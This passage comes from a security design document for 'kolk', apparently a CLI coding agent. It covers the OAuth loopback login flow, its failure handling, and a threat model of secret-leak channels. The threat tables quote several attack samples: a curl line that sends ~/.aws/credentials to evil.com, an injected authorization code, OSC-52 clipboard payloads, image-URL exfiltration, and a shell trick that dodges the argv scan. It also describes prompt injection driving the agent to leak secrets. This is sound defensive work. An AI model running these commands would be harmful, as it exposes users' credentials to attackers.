stylistic.** OpenRouter documents **no `state` parameter**, so the nonce must ride inside
`callback_url`; and it cannot ride in that URL's query string, because the docs never specify whether
OpenRouter appends `?code=` or `&code=`. Measured in Go today:

```
http://127.0.0.1:5123/cb?state=abc?code=XYZ   →  code=""     state="abc?code=XYZ"   ☠
http://127.0.0.1:5123/cb?state=abc&code=XYZ   →  code="XYZ"  state="abc"            ✓
http://127.0.0.1:5123/cb/NONCE?code=XYZ       →  code="XYZ"  path="/cb/NONCE"       ✓ always
```

**Rule: `callback_url` carries an EMPTY query and a 128-bit nonce in its path** —
`http://127.0.0.1:<ephemeral>/cb/<base64url(16 bytes)>`. This satisfies RFC 8252 §8.9 (a
high-entropy value bound to the pending request) on the only channel available, and §8.10 (*"MUST
verify that the URI on which the authorization response was received exactly matches"*) via a
**constant-time** path compare.

**③ The attack this prevents is code *injection*, not code theft.** Any web page the user is browsing
can make their browser issue `GET http://127.0.0.1:<port>/?code=<ATTACKER_CODE>` as a navigation, an
image or a fetch — the attacker never needs to read the response, only to deliver it. Without a
nonce the first request bearing a `code` wins, kolk exchanges *someone else's* authorization code,
and the victim's kolk ends up holding the **attacker's** OpenRouter key: every prompt they type is
billed to, and via `openrouter.ai/logs` **readable by**, the attacker. PKCE catches it at exchange
time (our verifier does not match their challenge → `400`), but only *after* the one-shot listener
is burned. The path nonce fails it before any network call, and a port scanner never reaches the
handler at all.

```go
func (s *loopback) ServeHTTP(w http.ResponseWriter, r *http.Request) {
    // RFC 8252 §8.10: the response must arrive on exactly the URI we advertised.
    // Constant time so a local process cannot time-oracle the nonce out of us.
    if r.Method != http.MethodGet ||
        subtle.ConstantTimeCompare([]byte(r.URL.Path), []byte(s.path)) != 1 {
        http.NotFound(w, r) // ← does NOT consume the flow
        return
    }
    w.Header().Set("Cache-Control", "no-store")
    w.Header().Set("Referrer-Policy", "no-referrer") // the code is in the URL
    // … classify ?error= / missing code / success, write the page …
    if f, ok := w.(http.Flusher); ok { f.Flush() }   // paint BEFORE tearing the socket down
    s.once.Do(func() { s.ch <- cb })                 // exactly one result, ever
}
```

`http.Server`, not `http.Serve` (only `Server` has `Shutdown`); `ReadHeaderTimeout: 5s`; `Flush`
before `Shutdown` or the browser shows a connection reset on the tab that just succeeded;
`sync.Once` so a browser prefetch or a refresh cannot double-exchange or deadlock;
`defer srv.Shutdown` under `context.WithoutCancel` so Ctrl-C still drains politely; the port is
opened only for the request and closed when the response is returned (RFC 8252 §8.3).

**The served page is self-contained** — no fonts, no analytics, **no subresource that could carry the
code out in a `Referer`**, and it works in both colour schemes:

```html
<!doctype html><meta charset=utf-8><title>kolk — signed in</title>
<meta name=color-scheme content="light dark">
<style>body{font:16px/1.6 ui-sans-serif,system-ui,-apple-system,Segoe UI,Roboto,sans-serif;
 display:grid;place-content:center;height:100vh;margin:0;text-align:center}
 h1{font-size:1.3rem;font-weight:600;margin:0 0 .4rem}p{margin:0;opacity:.65}</style>
<h1>kolk is signed in.</h1><p>You can close this tab and go back to your terminal.</p>
```

Denied → *"You cancelled the sign-in. Nothing was saved."* Malformed → *"Something went wrong. Go
back to your terminal — kolk will tell you what to do."*

#### 4.4 ★ The loopback flow is abandonable — browser-launch success is not reachability

`open <url>` exits 0 on a remote Mac nobody is watching. Fully deterministic cases where the browser
opens somewhere the listener cannot be reached: **VS Code Remote-SSH** (the terminal is spawned by
the VS Code server, so `SSH_CONNECTION` and `SSH_TTY` are unset, and macOS has no `DISPLAY` to
check), **mosh**, **a tmux/screen session reattached from elsewhere**, and **WSL2 in NAT mode**. Every
draft then waited out a 5-minute timeout and told the user to run the same command again.

**Rule: after 20 s of silence, print the headless variant with a *fresh* PKCE pair and read a pasted
code from stdin while the listener stays up. First to complete wins.** Both codes are single-use and
expire in 10 minutes, so racing them is harmless. ~30 lines, and it turns every environment above
from a 5-minute dead end into a 20-second self-heal. `KOLK_NO_BROWSER=1` pins the behaviour on a
machine the heuristics keep misclassifying.

**The URL is printed first and unconditionally**, before any attempt to open a browser — which makes
"no browser exists" a non-event instead of a failure path.

**The browser opener** goes through the L0 `shell` Spawner (arch §8 bans `os/exec` elsewhere),
refuses any scheme that is not `http`/`https` before handing a string to a launcher, and **spawns,
never runs** (`xdg-open` blocks for the browser's lifetime with some handlers):

| GOOS | Command |
|---|---|
| darwin | `open <url>` |
| linux | first of `xdg-open`, `x-www-browser`, `www-browser`, `wslview` on `PATH` |
| windows | **`rundll32 url.dll,FileProtocolHandler <url>`** — **not** `cmd /c start` (`cmd.exe` eats `&`, and our URL is nothing but query string), and **not** `windows.ShellExecute` (arch §1 permits `x/sys` only in `term` and `keystore`) |

Precedence for a custom opener: `KOLK_BROWSER` > config > `BROWSER`.

**Is putting the authorize URL in argv safe?** Yes, and the reason is worth writing down: everything
in it is public by PKCE's design — the challenge is a one-way hash, and the path nonce protects a
socket that is closed by the time anyone reads `ps`. **The verifier never leaves the process** and the
key arrives over TLS straight into a `secret.Value`. Contrast `kolk key sk-or-v1-…`, which *does* put
a live secret in argv — hence §0.1's three mitigations.

#### 4.5 Headless — SSH, container, no display

Detection is **advisory**: it picks the default, `--browser`/`--no-browser` override in both
directions, and guessing wrong costs one flag, never a hang. Cheapest first, no network:
`CI`/`GITHUB_ACTIONS`/`GITLAB_CI` → refuse (§4.6); stdin or stdout not a TTY → refuse;
`SSH_CONNECTION`/`SSH_TTY`/`SSH_CLIENT`, or linux with neither `DISPLAY` nor `WAYLAND_DISPLAY` and
not WSL, or a container (`/.dockerenv`, `/run/.containerenv`, `docker|containerd|kubepods` in
`/proc/1/cgroup`), or `net.Listen` failing outright (seccomp, netns) → paste-a-code. **WSL is not
headless** — `wslview` reaches the Windows browser.

No loopback listener is started at all in paste mode; `code_challenge` is **required** there, because
the code is displayed on screen.

```console
$ kolk login
kolk detected an SSH session — no browser here. Using the paste-a-code flow.

  1. open this on any device (a phone is fine):
     https://openrouter.ai/auth?code_challenge=E9M…&code_challenge_method=S256&key_label=kolk

  2. sign in, then paste the code it shows you.  It expires in 10 minutes.

  code › 
```

This is the one place a URL genuinely works from another device, because nothing has to reach back
to this machine.

#### 4.6 CI — refuse, never hang

```console
$ CI=1 kolk login
kolk login needs a human. In CI, set an environment variable instead:

    OPENROUTER_API_KEY=sk-or-v1-…        (also accepted: KOLK_API_KEY)

  Make one at openrouter.ai/keys and store it as a repository secret.
  Give it a spend limit — kolk cannot set one for you.
exit 2
```

A CI job blocked on stdin is a six-hour timeout, so this is a refusal, not a fallback. `--no-browser`
is still *honoured* in CI for someone in a `tmate` session, but never the default. **`kolk key <key>`
refuses here identically** (§0.1); `kolk key -` stays allowed.

#### 4.7 Exchange errors — do not branch on HTTP status

Probed live 2026-08-22; the docs and the server disagree:

| Sent | Documented | **Actual** |
|---|---|---|
| invalid / expired / reused `code` | `403 Invalid code or code_verifier` | **`400`** `{"error":{"message":"Invalid code","code":400}}` |
| `code_challenge_method:"S512"` | `400 Invalid code_challenge_method` | `400`, **different envelope**: `{"success":false,"error":{"name":"ZodError",…}}` |
| `GET` instead of `POST` | `405` | **`404`** |

⇒ **branch on `error.message`, a string in *both* envelopes, never on HTTP status or `error.code`**,
and always keep a fallback. `"Invalid code"` → `ErrCodeRejected` (expired, reused, wrong-verifier
and forged are indistinguishable, which is fine — the user remedy is identical). `ZodError` →
`ErrClientBug`: *kolk* sent something malformed; say so and print the request **shape**, never the
body.

There is **no documented revoke endpoint**, and kolk **cannot** request a spend-capped key
(`expires_at`/`limit` live only on the authenticated `POST /auth/keys/code`, which is the web page's
call). `doctor` and the success screen say so plainly rather than implying safety.

#### 4.8 Failure matrix — every path, with a message and an exit code

**Exit codes are arch §9's five and no others** (`0 ok · 1 error · 2 usage · 3 budget · 130
interrupt`). Every draft invented `4/5/6/7`; that would fork the vocabulary `spec/errors.md` owns.
Machine-readable discrimination is the `error.type` field on the stream-json exit, not the code.

| # | Failure | Detection | Behaviour | Exit |
|---|---|---|---|---|
| F1 | user clicks Deny | `?error=` on the callback | `Cancelled — nothing was saved.` | **1** |
| F2 | browser opens, user never returns | 5-min deadline (`--timeout`) | at 20 s: switch to paste mode (§4.4); on expiry: `Timed out. Run kolk login again, or paste a key: kolk key sk-or-v1-…` | **1** |
| F3 | code expired (>10 min) or already used | `"Invalid code"` | `That code was rejected — codes last 10 minutes and work once. Run kolk login again.` | **1** |
| F4 | exchange 5xx / DNS / TLS / proxy | transport error, or status ≥ 500 | **one** retry after 1 s (the code is still inside its window), then `Couldn't reach openrouter.ai: <err>. Your code is valid for a few more minutes — run kolk login again.` | **1** |
| F5 | 200 with an empty/absent `key` | `ParseExchange` | `OpenRouter returned no key. This is a bug — report it with: kolk version` | **1** |
| F6 | `ZodError` envelope | `error.name` | `kolk sent a malformed request (bug): <message>` + the request **shape**, never the body | **1** |
| F7 | a second `kolk login` running | `lock.TryFlock($data/kolk/login.lock)` | `Another kolk login is running (pid 4711). Finish or cancel it first.` Ephemeral ports mean there is no *port* collision; the lock exists only so two flows cannot race on `Store.Set`. | **1** |
| F8 | someone hits the callback port first | path ≠ nonce, or method ≠ GET | `404`, **flow continues**, one line to `--debug` only — a scanner must not be able to spam the user's screen | — |
| F9 | forged/injected code reaches the right path | passes F8, fails the exchange | F3's message. PKCE is the second line of defence; the nonce is the first. | **1** |
| F10 | cannot bind `127.0.0.1:0` (sandbox, netns) | `net.Listen` error | **automatically** fall through to paste mode, one explanatory line | — |
| F11 | no browser / spawn fails | `exec.ErrNotFound` | the URL is already on screen (§4.4); switch to paste mode | — |
| F12 | stdin not a TTY in paste mode | `term.IsTerminal(0)` | `kolk login is interactive and stdin is not a terminal.` + `echo "$KEY" \| kolk key -` | **2** |
| F13 | Ctrl-C mid-flow | signal → ctx cancel | `Shutdown` in the `defer`, `Cancelled.`, no partial write | **130** |
| **F14** | **signed in, but `Store.Set` fails** (locked keychain, read-only `$HOME`, ENOSPC) | error from `Set` | ★ **must not read as a login failure** — the flow succeeded and burned a single-use code: *"Signed in, but couldn't save the key: `<err>`. Your key is valid — save it with `kolk key -`, or run `kolk login` again."* It cannot print the key (`%v` redacts) and **`--print-key` is deliberately not implemented**; re-running login is cheap and mints a *new revocable* key. | **1** |
| F15 | saved, but the smoke `GET /api/v1/key` fails | post-save verification | **warn, do not fail**: `Saved. (Couldn't verify it just now: <err>.)` | **0** |

Success:

```console
Signed in. openrouter  sk-or-v1-…951c
saved to   ~/.local/share/kolk/credentials.json (0600)
balance    $4.20 remaining · free tier: 50 requests/day until $10 of credit, then 1000/day
manage     kolk key --manage openrouter     (rename, set a limit, revoke)
           kolk cannot set a spend limit on this key — set one there.

Try it:  kolk "explain this repo"
```

#### 4.9 `kolk logout`

```console
$ kolk logout
removed  openrouter/default  from ~/.local/share/kolk/credentials.json

This removed only the local copy. It does NOT revoke the key — anyone who has it
can still use it. Revoke it with:  kolk key --manage openrouter
```

Lifted from `gh auth logout`'s exact register: *"The authentication configuration is only removed
locally. This command does not revoke authentication tokens."* Removes the manifest row **and** the
backend value; a half-removed credential is reported as an orphan (§3.8), never silent.

---

### 5. Leak channels — mechanism, defence, and where it is enforced

#### 5.1 Five defects that exist in the repo TODAY (verified 2026-08-22)

| # | Fact | Evidence |
|---|---|---|
| **G1** | **`OPENROUTER_API_KEY` reaches every command the model runs.** `internal/tools/tools.go:119` builds `exec.CommandContext(cctx,"bash","-c",a.Command)` and **never assigns `cmd.Env`**; `go doc os/exec Cmd`: *"If Env is nil, the new process uses the current process's environment."* Repo-wide grep for `cmd.Env\|os.Environ`: **zero hits.** So `env`, a Makefile, an npm `postinstall`, a leaked CI log — all see the key, today, always. | grep |
| **G2** | The key lives in `config.json` **next to** `model`/`base_url`/`tiers` — the file users are told to read, `cat` for the model, copy into dotfiles and paste into issues. | `internal/config/config.go` |
| **G3** | **`config.Save` cannot repair a bad mode and is not atomic.** Reproduced: a pre-existing 0644 file stays 0644 after a 0600 `os.WriteFile`. It is also the only writer in the repo that is not tmp+rename. | executed (§3.4) |
| **G4** | **Checkpoints copy other people's secrets into kolk's state dir and keep them after the source is deleted.** `checkpoint.Record` (`checkpoint.go:76-95`) `os.ReadFile`s the **pre-edit** content of any file the model writes into `<session>.ckpt/NNNNNN.bak`. Model edits `.env` or `terraform.tfvars` ⇒ the old secret lives in a second place, **surviving the user rotating or deleting the original**. | source |
| **G5** | **`checkpoint.RewindLastTurn` is a permissions-downgrade primitive.** `checkpoint.go:135-138` restores with a hardcoded `os.MkdirAll(…, 0o755)` and **`os.WriteFile(e.Path, data, 0o644)`**. A 0600 secret-bearing file the model edited comes back **world-readable** after `/rewind`, invisibly. | source |
| **G6** | Every byte of tool output is persisted verbatim: `engine/agent.go:366-372` appends the result as a `role:"tool"` message and `session.Save` marshals it to disk. `maskKey` is used in **exactly one place**: `config show`. | grep |

#### 5.2 Disk

| # | Channel | Likelihood (first month) | Defence | Enforced in |
|---|---|---|---|---|
| D1 | **session JSON ← tool output** (`env`, `cat .env`, `git config --list`) | **Certain** | §5.4's split scrub at the tool-result boundary + the known-literal set | the single `return` of `tools.Execute` |
| D2 | session JSON ← **user paste** (*"why does sk-or-v1-… 401?"*) | Medium | **Never prompt, never mutate.** Send exactly what the user typed; **register the matched value as a known literal** so every *downstream* sink scrubs it; print one stderr line afterwards. Recovery: `kolk sessions redact <id>` rewrites a stored transcript through `Scrub`. | `cli/repl.go` |
| D3 | session JSON ← assistant echo | High (follows D1) | cut at the source by D1; plus the terminal-frame scrub | `bus.Publish` |
| D4 | `stats.jsonl` | Low — **structurally clean today** | keep it that way: `stats.Record` gains no `string` field outside the enum/id allow-list | `arch_test.go` |
| D5 | SQLite dashboard (item 17) + its `-wal`/`-shm` siblings | Certain once item 17 ships | it is a bus subscriber ⇒ D1/D3 cover content. Plus: `os.OpenFile(db, O_CREATE\|O_EXCL, 0600)` **before** SQLite opens it — SQLite copies the db's mode onto `-wal`/`-shm`, which hold recent uncommitted rows | `dash/store.go` |
| D6 | **checkpoint `.bak` of a secret file** (G4) | Medium-High — `.env` edits are routine | `checkpoint.Record` **refuses** to snapshot a path on the shared secret-path list and records `{existed:true, backup:"", refused:"secret-path"}`. The edit still proceeds; `/rewind` says *"cannot restore `.env` — kolk deliberately did not copy it."* | `checkpoint.go` + `perm/secretpaths.go` (one data file, shared with D7 and §5.5) |
| **D7** | **`/rewind` downgrades a 0600 file to 0644** (G5) | Medium, silent, and it is a **security bug wearing a feature's clothes** | capture `os.Stat(path).Mode()` into `checkpoint.Entry` at `Record` time and restore **that** mode; where unknown use **0600, never 0644**; when `existed:false`, do not create the file at all | `checkpoint.go` — two lines in `Entry`, two in `Restore`, one round-trip test |
| D8 | **the config file itself** (G2, G3) | Certain | credentials move to `$data/kolk/credentials.json` via the atomic writer; `config.json` never holds one again; `internal/config` does not import `internal/keystore` | import rule + `keystore/migrate.go` |
| D9 | dotfiles repo / Dropbox / Mackup / **backups** | Medium | data dir not config dir; `.gitignore` on first write; **and one honest line in `doctor`: "this file is included in whatever backs up your home directory."** `.gitignore` does nothing for Time Machine, restic, Arq or a corporate agent, and pretending otherwise is the lie | `keystore/file_*.go` |
| D10 | **network filesystem** (`nfs`/`smbfs`/`afpfs`/`fuse.*`) | Low but total | on NFSv3 the UID is asserted by the client, so 0600 is **not** access control. `statfs` at first write, name the filesystem, and point at the keychain — **the one case where the keychain is genuinely the right default** | `keystore/file_unix.go` |
| D11 | **core dumps** | Low (macOS `ulimit -c` = 0; Linux distro-dependent) | `syscall.Setrlimit(RLIMIT_CORE, {0,0})` at `cli.Main` entry — stdlib `syscall`, one call, < 10 µs, in an L0 `*_unix.go`. Under `GOTRACEBACK=crash` + systemd-coredump a panic writes the heap (vault included) to `/var/lib/systemd/coredump/`. `GOTRACEBACK` stays `single`. | `keystore/rlimit_unix.go` |
| D12 | **`$EDITOR` swap files** next to the credential | Low after D8 | there is **no `kolk credentials edit`** — the exposure is designed out | — |
| D13 | **fixed `.tmp` names across all of kolk's state** | Low but nasty | **one `internal/atomicfile.Write` used by EVERY writer of kolk state** — credentials, sessions, stats, checkpoint manifests, `.bak` files, the daemon token. `session.go:60` and `checkpoint.go:66` use a fixed `.tmp` with `os.WriteFile` today: on a shared or NFS home with a guessable session id, a pre-created symlink turns a session save into a write primitive; an interrupted older kolk leaves a 0644 `.tmp` that silently receives the next transcript | `internal/atomicfile` |
| D14 | memory zeroing | — | **say the honest thing:** `secret.Close()` clears the vault's `[]byte`s, which narrows the window. Go strings are immutable and `Reveal()` hands out a GC-owned copy. Documented as **partial**; never a README claim | Risks |

#### 5.3 The model

| # | Channel | Defence |
|---|---|---|
| M1 | system prompt | built from mode + cwd + memory files only, and `engine` has **no type that can hold a credential** — impossible rather than forbidden |
| M2 | `env` / `cat .env` / `cat ~/.zshrc` / `git config --list` → model → third-party provider → session → dashboard → a GitHub issue | §5.4's split scrub, with kolk's own live keys as **exact known literals** |
| **M3** | **kolk's own credential store, read through a tool** — the single most predictable thing a curious coding agent does with its own config directory | **The one hard deny, on RESOLVED paths, surviving `--yolo`.** `read_file`/`list_dir`/`edit_file`/`write_file` refuse any path resolving under `paths.Data()/credentials.json` **and under the resolved `serve.token_file`** (§5.5). In `bash` it is a **best-effort argv scan, documented as best-effort** — `S=kolk; security find-generic-password -s "${S}rabbi"` defeats it — so the real backstop is exact known-literal scrubbing plus §5.5's spawn refusal. |
| M4 | exfiltration (`curl -d "$(cat ~/.aws/credentials)" evil.com`), possibly driven by prompt injection from a fetched page | Scrub cuts the *source* — the model never holds the plaintext to exfiltrate. **Residual, stated not papered over:** the shell can pipe file→network without those bytes passing through kolk. The real fix is **item 13's sandbox/network toggle**, and item 5 says so rather than claiming coverage. |
| M5 | **ANSI/OSC injection in tool output** — `ESC ] 52 ; c ; <base64> BEL` writes the user's **clipboard**; CSI sequences repaint the screen to **forge a confirm prompt** (*"Run shell command: ls"* while the real command is `curl … \| sh`) | `redact.SanitizeControls` on everything echoed to the terminal: keep `\n` and `\t`, drop all other C0, all C1, all OSC, and every CSI kolk did not generate. This is a **spoofing** channel as much as a leak channel. Golden test includes an OSC-52 payload. |
| M6 | the dashboard rendering model output (`![](http://evil/?k=…)` fetched when the user opens the page later) | `Content-Security-Policy: default-src 'self'; img-src 'self' data:; connect-src 'self'` on every `/dash/*` response; the SPA never renders remote URLs |
| **M7** | **redaction breaks `edit_file` — data loss, not leakage** | See §5.4's write-back rule. This is the one place a redaction system causes irreversible harm, and it is the rule most likely to be deleted by whoever finds it annoying. |

#### 5.4 The scrubber, and the split that makes it usable

**Measured on this machine (Apple M3, go1.26.4), 1 MiB of realistic tool output:**

| Implementation | Throughput | 1 MiB | **12 KB** (today's `truncate` cap) |
|---|---|---|---|
| one `regexp` alternation of the shape set | **9.3 MB/s** | 113 ms | **1 329 µs** |
| 256-entry first-byte gate + literal prefix compare + charset run | **219–230 MB/s** | 4.8 ms | **53 µs** |

**25×.** A regexp costs 113 ms per MiB — **20× kolk's entire cold start** — on a path item 13 wants
to make streaming. **Ship the scanner.** CI asserts **≥ 150 MB/s** and **< 200 µs on 12 KB** so a
future contributor cannot quietly swap a regexp back in.

**★ The split, by what a false positive costs.** A single scrub set is the reason every draft made
the agent unable to edit a backend repo containing `.env.example` with
`OPENAI_API_KEY=sk-proj-EXAMPLE0000000000`, a JWT fixture in `testdata/`, or kolk's own redaction
tests.

| Sink | Rules applied |
|---|---|
| **What the model sees** (the single `return` of `tools.Execute`) | **(a)** known literals — every credential this *process* holds, exact match, zero false positives, zero false negatives for the secrets we own; **(b)** high-confidence shape patterns only: anchored prefix + charset + minimum length, with **placeholder suppression** (`EXAMPLE`, `XXXX`, `YOUR_`, `CHANGEME`, `<…>`, `$VAR`, `${…}`, `""`, any run of one repeated character); **(c)** a reviewed **path carve-out** where shape scrubbing is skipped (literals still applied): `*.example` `*.sample` `*.template` `*.dist` `testdata/**` `*_test.go` `*.golden` `*.md`. **No keyword rule.** |
| **Durable and published copies** — session file, `stats.jsonl`, the bus and all three protocol exits, the debug log, the dashboard | the **full** set: known literals + every shape pattern + the keyword rule `(api[_-]?key\|secret\|token\|password\|credential)\s*[:=]\s*<value ≥ 12>`, placeholder-excluded. A mangled string costs nothing functional here. |

Patterns come from the one `keyshapes.json` (§0.2) plus: JWT `eyJ…\.…\.…` **with a cheap base64 check
that segment 1 begins `{"alg"`** (kills most false positives), `Bearer <16+>`, and
`-----BEGIN [A-Z ]*PRIVATE KEY-----`…`-----END` as a whole block. **No generic entropy heuristics** —
they mangle git SHAs, base64 fixtures and UUIDs.

**Ordering: known literals first, then prefixes, then (durable sinks only) the keyword rule.**
Replacement is **stable and idempotent**: `[redacted sk-or-v1 #3f2a]`. The per-process-salted
fingerprint lets the model still reason — *"these two are the same key"*, *"the key changed after you
rotated it"* — without holding the value, which is most of what the legitimate debugging case wanted.

**★ Register EVERY stored credential as a known literal, not just the one being used.** kolk stores
credentials for providers it cannot yet reach (`anthropic`, and via `kolk key <provider> <key>`
Mistral, Together, Cohere, a self-hosted gateway). **None of those match any shape pattern** — a
Mistral key is 32 bare alphanumerics. So when the model reads the credentials file, the
stored-but-unused keys pass the scrubber **verbatim** into the transcript, the dashboard and the
third-party provider. The file backend already holds every inline value in memory when it parses the
manifest: **register them all at parse time.** Zero extra I/O, closes the gap completely for the file
backend. For keychain/DPAPI/helper entries there is no value to register, and that asymmetry is
itself an argument against making a non-file backend the default.

**Streaming hold-back.** `redact.Writer` retains the last **128 bytes** until the next chunk arrives
and flushes the tail on `Close`, or a key split across an SSE frame boundary passes through as two
harmless-looking halves. Test: a table over **every** split offset.

**Deliberately NOT scrubbed, as stated decisions rather than omissions:** user input (D2 — warn,
never mutate); files on disk (kolk *edits* your `.env`; it does not rewrite it); and **streaming
assistant deltas**, because a 128-byte hold-back visibly stutters the UI and streaming latency is a
product property. The reasoning that makes deltas safe: the only way a secret reaches a delta is if
the tool-boundary scrub failed or the user typed it, since the model cannot echo what it never
received. The **terminal message frame is scrubbed before it is persisted or published**, and when
that scrub actually fires the bus emits `message.redacted` so a client can re-render.

**★ M7 — the write-back rule, scoped so it does not break real repos.** `write_file`/`edit_file`
refuse content containing a redaction sentinel — but **only sentinels this process minted**, matched
on the fingerprint (which is per-process-salted, so this is exact). The message names the file the
sentinel came from:

```
This text contains a kolk redaction marker minted from .env:3 — the original value
was never shown to you. Edit around it, or ask the user to make the change.
```

Combined with the path carve-out, the agent can still edit `.env.example`, JWT fixtures, and kolk's
own redaction tests and docs. Without the scoping, kolk could not edit its own security code.

**False positives are real**, and the keyword rule is the highest-yield and highest-false-positive
pattern. Exactly one escape hatch: **`/redact off` for the session**, which prints a persistent
banner in the transcript header. Not a flag, not per-path, not per-tool.

#### 5.5 The environment passed to child processes — all FOUR classes, named now

`shell.Cmd.Env` is a **required, non-nil field**; nil returns `ErrEnvUnset` and panics under test.
That single rule is what closes G1. **Item 5 names all four child classes now**, so item 16 does not
reproduce G1 in the release MCP ships:

| Child | Policy | Why |
|---|---|---|
| **the `bash` tool** | **deny-list subtraction over the user's real environment** | The user's env *is* their working environment: `GOPATH`, `NODE_ENV`, `AWS_PROFILE`, `GH_TOKEN` so `gh` works. Clearing it breaks every legitimate build and is a North-star violation. kolk removes only **what kolk owns**: (a) every variable kolk resolved a credential from *this run*, (b) `KOLK_*`, (c) the curated provider-key names from `keyshapes.json`. `doctor` prints the subtraction count so it is inspectable rather than folklore. |
| **the vendor `agentcli` spawn** | **allow-list over a cleared environment** — unchanged from item 4 §5.1 G2/C7 | For the vendor the mere **presence** of `ANTHROPIC_API_KEY` silently switches billing from the user's Max plan to their API account. That is **correctness**, and deny-lists forget. |
| **MCP servers** (item 16, stdio and HTTP) | **allow-list over a cleared environment**, plus explicitly declared per-server vars | They are **third-party code the user installed from a README**, not the user's shell. |
| **hooks** (item 16, pre/post tool-call shell commands) | same deny-list as the `bash` tool | they are the user's own commands |

**The asymmetry is the design, not an inconsistency**, and stating the reason is what stops someone
"unifying" them later: for the user's shell the env is the job (usability); for third-party and
vendor children the env is a billing and credential switch (correctness).

**Two more rules item 16 inherits:** every tool result, **whatever its transport**, returns through
the single `tools.Execute` chokepoint — **MCP tools are registry entries, not a parallel path** —
and MCP results are foreign frames, so they get `SanitizeControls` (a malicious MCP server can return
OSC-52 clipboard payloads and forged confirm prompts just as easily as `bash` can).

**And a runtime guard that turns a convention into a mechanism:** `shell.Spawn` **refuses**
(`ErrSecretInArgv`) to launch any process whose argv or env contains a registered vault literal.
`internal/shell` (L0) importing `internal/redact` (L0, pure) is a declared intra-L0 edge (§2.1).

**One honest, unfixable gap.** On Linux a child can read `/proc/<kolk_pid>/environ` — the parent's
*original* env block; `os.Unsetenv` does not rewrite the kernel's copy of the initial stack. `ps -E`
is the macOS analogue for the same user. **No amount of `cmd.Env` hygiene fixes this.** The defence
is the storage decision: `OPENROUTER_API_KEY` is a CI/override path, not the default, and `doctor`
says it in one line: *"an exported API key is readable by every process you run; kolk's stored key is
not."*

#### 5.6 Reading a secret-shaped file: allow, redact, escalate, deny exactly one thing

- **Reads are allowed.** Blocking `cat .env` breaks legitimate work and is trivially routed around
  with `head`, `sed` or `python -c`. A blocklist there is **false assurance, which is worse than
  none**.
- **Output is scrubbed** (§5.4) — the only intervention that reduces harm without guessing intent,
  and it costs 53 µs on a 12 KB result.
- **Known-secret paths always confirm, even under `--yolo`** — `~/.ssh/id_*`, `~/.aws/credentials`,
  `.env*`, `*.pem`, `*.p12`, `*.tfvars`, `**/master.key` — naming the file. One data file
  (`perm/secretpaths.go`), shared with D6 and D7.
- **kolk's own credential store and the daemon bearer token are the single hard deny** (M3, §5.7).

For comparison: Claude Code and Codex do not scrub tool output at all and rely on permission prompts
plus user trust; Aider and OpenCode ship deny-globs. Scrubbing at the tool boundary is kolk's
differentiator and it is nearly free.

#### 5.7 The wire, the daemon, and the bearer token

| # | Channel | Defence |
|---|---|---|
| W1 | a protocol event carrying a secret | **(a) unreachability** — `protocol` is L1 with *"none, forever"*, so it cannot name `secret.Value`; `bus` (L2), `engine` (L4), `session`/`stats`/`checkpoint` (L5) do not import `internal/secret` at all. **(b) net** — `bus.Publish` scrubs. |
| **W2** | **a credential-ADJACENT type on the wire** | `keystore.Origin`/`Step`/`Resolution` and `keystore.Entry` carry a mask and a key hash. They have **no json tags and no `MarshalJSON`**, `protocol` may not import `keystore` (rule **S5**), and the **same reflect-walk that bans `secret.Value` from every event, session, stats row and dashboard record also bans these four types**. There is no `credential.resolved` event and the test says so. |
| W3 | `kolk -p --output stream-json` piped into a CI artifact | inherits W1(b) — `streamjson.go` is a bus subscriber, it formats nothing itself |
| W4 | HTTP+SSE to desktop/iPad | **credentials never cross it.** No `POST /v1/credentials`, no `/v1/login`. `kolk key` and `kolk login` are **local-only verbs**, and `spec/kolk.openapi.yaml` has no schema that can express a credential. Conformance test: no path matching `(?i)cred\|key\|login\|auth` outside the bearer security scheme. **A `kolk key` typed on an iPad is out of scope by design, written down now**, so nobody adds it in v0.6; a remote user who wants to change a key uses SSH. |
| **W5** | **★ the daemon bearer token is a CODE-EXECUTION credential, not a read credential** | Arch §7 puts it at `$config/token` (0600). Possession lets a client run turns, and turns run the `bash` tool — so it is **strictly more powerful than the API key**: arbitrary local code execution as the user, *plus* the key. It is a `secret.Value` like any other, compared with `crypto/subtle.ConstantTimeCompare`, written by the same atomic writer, and **covered by the same hard deny as the credential store** (M3). It is still a **different noun** — it authenticates *clients to kolk*, not *kolk to a provider* — so `doctor` never lists it in the credentials block. **Item 12 inherits this invariant:** every rule that applies to a provider key applies to it, plus rate-limiting and an explicit opt-in for non-loopback binds. |
| **W6** | **`?token=` in the URL** | Browsers' `EventSource` cannot set an `Authorization` header, so every local-dashboard project eventually puts the token in the query string → access logs, `Referer`, browser history, shoulder-surfing. **The mux hard-refuses any request carrying `token`/`access_token`/`api_key` as a query parameter, with a 400 that names this rule** so nobody adds it later. The SPA does one `POST /v1/session` with the bearer and receives a `__Host-kolk` cookie (`HttpOnly; SameSite=Strict; Path=/`); `EventSource` then works with no header. |
| W7 | DNS rebinding — any page in the user's browser can POST to `127.0.0.1` | bearer required **and** `Origin`/`Host` validated against an allow-list; `Access-Control-Allow-Origin` never `*`; `X-Content-Type-Options: nosniff` |
| **W8** | **request logging** | **`net/http/httputil` is on the module-wide CI import denylist** — `DumpRequest` prints `Authorization: Bearer sk-or-v1-…` and it is the first thing anyone reaches for when debugging SSE. Debug tracing goes through one helper that logs method + `url.URL.Redacted()` + status + `X-Generation-Id` and **cannot see headers**. Paired with §2.3's ban on formatting a `*http.Request`/`http.Header`. |
| W9 | URL-embedded credentials | `--base-url https://user:tok@litellm.internal` is a normal LiteLLM shape, and `cmd/kolk/main.go:407` writes it **verbatim into `config.json`** today. **Close it at the write, not the print:** `config set-base-url` and the config loader **strip userinfo** and print what was done (or refuse with *"credentials go in `kolk key`, not the URL"*). CI assertion: no value in `config.json` matches `://[^/@]*:[^/@]*@`. Every printed URL still goes through `url.URL.Redacted()`. |

#### 5.8 Diagnostics

| # | Channel | Defence |
|---|---|---|
| X1 | **`kolk doctor`** — output is *made* to be pasted into issues | two structurally different sections (§6.4), **zero `Reveal()` calls** (CI-asserted), and **no key-derived digest ever rendered** (§1.6) |
| X2 | `--debug` log | one writer, `debuglog.Write`, which applies the **full** scrub set. Nothing else may open the file. 0600 in the state dir, never the repo. |
| X3 | **a panic handler printing a request struct** | **Medium and catastrophic** — closed by §2.3 (`AuthTransport`) plus the AST ban on formatting `*http.Request`/`http.Header`, not by the handle type alone |
| X4 | the traceback itself | Go prints pointer+len for strings, never contents; the danger is X3's recover handler. `GOTRACEBACK` stays `single`. |
